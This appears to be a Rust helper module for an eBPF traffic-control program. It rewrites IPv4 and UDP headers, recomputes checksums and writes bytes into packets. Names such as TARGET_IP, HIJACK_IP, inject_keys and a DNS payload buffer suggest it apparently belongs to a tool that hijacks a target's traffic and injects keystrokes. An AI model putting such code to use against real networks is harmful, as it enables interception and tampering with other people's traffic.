use aya_ebpf::{
    helpers::{bpf_skb_load_bytes, bpf_skb_store_bytes},
    macros::map,
    maps::Queue,
    programs::TcContext,
};
use aya_log_ebpf::{debug, error, info};
use network_types::{eth::EthHdr, ip::Ipv4Hdr};

#[no_mangle]
pub static TARGET_IP: u32 = 0;

#[no_mangle]
pub static HIJACK_IP: u32 = 0;

#[no_mangle]
pub static KEYBOARD_LAYOUT: u8 = 0;

pub const IP_OFFSET: usize = EthHdr::LEN;
pub const IP_TOT_LEN_OFFSET: usize = IP_OFFSET + 2;
pub const IP_CSUM_OFFSET: usize = IP_OFFSET + 10;
pub const IP_SRC_ADDR_OFFSET: usize = IP_OFFSET + 12;
pub const IP_DEST_ADDR_OFFSET: usize = IP_OFFSET + 16;
pub const UDP_OFFSET: usize = IP_OFFSET + Ipv4Hdr::LEN;
pub const UDP_DEST_PORT_OFFSET: usize = UDP_OFFSET + 2;
pub const UDP_LEN_OFFSET: usize = UDP_OFFSET + 4;
pub const UDP_CSUM_OFFSET: usize = UDP_OFFSET + 6;
pub const DNS_QUERY_OFFSET: usize = UDP_OFFSET + 8;

pub const BPF_ADJ_ROOM_NET: u32 = 0;

pub const KEYS_PAYLOAD_LEN: usize = 8;
pub const DNS_PAYLOAD_MAX_LEN: usize = 128;

//TODO: define keyboard layout as enum
#[derive(Default, Copy, Clone)]
#[repr(C)]
pub struct KeyEvent {
    pub layout: u8, // 0:qwerty 1: azerty
    pub key: u8,
}
#[map]
pub static DATA: Queue<u8> = Queue::with_max_entries(4096, 0);

pub enum UpdateType {
    Src,
    Dst,
}

pub fn update_addr(
    ctx: &mut TcContext,
    old_be: &u32,
    new_be: &u32,
    update_type: UpdateType,
) -> Result<(), i64> {
    let offset = match update_type {
        UpdateType::Src => {
            debug!(ctx, "updating src addr");
            IP_SRC_ADDR_OFFSET
        }
        UpdateType::Dst => {
            debug!(ctx, "updating dst addr");
            IP_DEST_ADDR_OFFSET
        }
    };
    ctx.store(offset, new_be, 0).map_err(|_| {
        error!(ctx, "error writing new address ");
        -1
    })?;
    debug!(
        ctx,
        "update addr: {} => {} ",
        u32::from_be(*old_be),
        u32::from_be(*new_be)
    );

    ctx.l3_csum_replace(IP_CSUM_OFFSET, *old_be as u64, *new_be as u64, 4)
        .map_err(|_| {
            error!(ctx, "error: l3_csum_replace");
            -1
        })?;
    Ok(())
}

pub fn _update_port(
    ctx: &mut TcContext,
    old_be: &u16,
    new_be: &u16,
    update_type: UpdateType,
) -> Result<(), i64> {
    let offset = match update_type {
        UpdateType::Src => {
            info!(ctx, "updating src port");
            UDP_OFFSET
        }
        UpdateType::Dst => {
            info!(ctx, "updating dst port");
            UDP_DEST_PORT_OFFSET
        }
    };
    debug!(
        ctx,
        "update port: {} => {} at the offset {}",
        u16::from_be(*old_be),
        u16::from_be(*new_be),
        offset
    );
    ctx.store(offset, new_be, 0).map_err(|_| {
        error!(ctx, "error writing new port");
        -1
    })?;

    Ok(())
}

pub fn update_udp_hdr_len(ctx: &mut TcContext, new_be: &u16) -> Result<(), i64> {
    debug!(ctx, "updating udphdr len:");
    ctx.store(UDP_LEN_OFFSET, new_be, 0).map_err(|_| {
        error!(ctx, "error writing new udp hdr len ");
        -1
    })?;
    Ok(())
}

pub fn update_ip_hdr_tot_len(ctx: &mut TcContext, old_be: &u16, new_be: &u16) -> Result<(), i64> {
    debug!(ctx, "updating iphdr tot len:");
    ctx.store(IP_TOT_LEN_OFFSET, new_be, 0).map_err(|_| {
        error!(ctx, "error writing iphdr tot len ");
        -1
    })?;
    ctx.l3_csum_replace(IP_CSUM_OFFSET, *old_be as u64, *new_be as u64, 4)
        .map_err(|_| {
            error!(ctx, "error: l3_csum_replace");
            -1
        })?;

    Ok(())
}

pub fn inject_keys(
    ctx: &mut TcContext,
    offset: usize,
    payload: [u8; KEYS_PAYLOAD_LEN],
) -> Result<(), i32> {
    for (idx, k) in payload.iter().enumerate() {
        ctx.store(offset + idx, &k.to_be(), 0).map_err(|_| {
            error!(ctx, "error injecting payload");
            -1
        })?;
    }
    Ok(())
}

pub fn load_bytes(ctx: &mut TcContext, offset: usize, dst: &mut [u8]) -> Result<usize, i64> {
    let len = usize::try_from(ctx.skb.len()).map_err(|core::num::TryFromIntError { .. }| -1)?;
    let len = len.checked_sub(offset).ok_or(-1)?;
    let len = len.min(dst.len());
    if len == 0 {
        return Err(-1);
    }
    debug!(ctx, "loading {} bytes", len);

    let len_u32 = u32::try_from(len).map_err(|core::num::TryFromIntError { .. }| -1)?;
    let ret = unsafe {
        bpf_skb_load_bytes(
            ctx.skb.skb as *const _,
            offset as u32,
            dst.as_mut_ptr() as *mut _,
            len_u32,
        )
    };
    if ret == 0 {
        Ok(len)
    } else {
        Err(ret)
    }
}

pub fn store_bytes(
    ctx: &mut TcContext,
    offset: usize,
    src: &[u8],
    flags: u64,
) -> Result<usize, i64> {
    let len = usize::try_from(ctx.skb.len()).map_err(|core::num::TryFromIntError { .. }| -1)?;
    let len = len.checked_sub(offset).ok_or(-1)?;
    let len = len.min(src.len());

    let len_u32 = u32::try_from(len).map_err(|core::num::TryFromIntError { .. }| -1)?;
    if len_u32 == 0 {
        return Err(-1);
    }

    debug!(ctx, "storing {} bytes", len_u32);
    unsafe {
        let ret = bpf_skb_store_bytes(
            ctx.skb.skb as *mut _,
            offset as u32,
            src as *const _ as *const _,
            len_u32,
            flags,
        );
        if ret == 0 {
            Ok(len)
        } else {
            Err(ret)
        }
    }
}
